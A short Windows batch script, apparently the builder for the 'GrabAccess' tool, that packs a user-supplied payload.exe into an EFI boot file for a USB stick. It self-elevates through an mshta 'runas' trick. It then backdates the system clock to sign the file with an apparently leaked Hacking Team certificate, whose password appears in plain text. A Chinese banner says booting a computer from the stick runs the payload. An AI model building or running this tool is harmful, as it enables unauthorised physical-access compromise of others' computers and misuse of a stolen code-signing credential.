@echo off
chcp 65001

%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
cd /d %~dp0

copy /b "bin\nativex64.exe" + "bin\Block.bin" + "payload.exe" + "bin\Block.bin" "EFI/boot/ANT.exe"

date 14-04-15
"bin\signtool.exe" sign /v /ac "bin\VeriSignG5.cer" /f "bin\HT_Srl.pfx" /p GeoMornellaChallenge7 /fd sha1 /nph /debug "EFI/boot/ANT.exe"
net stop w32time
net start w32time
w32tm /resync /nowait

echo.
echo ===========================GrabAccess by ANT Project============================
echo 将EFI文件夹复制到FAT或FAT16格式的U盘根目录，接入计算机后从U盘引导，即可执行Payload。
echo ===========================GrabAccess by ANT Project============================
@pause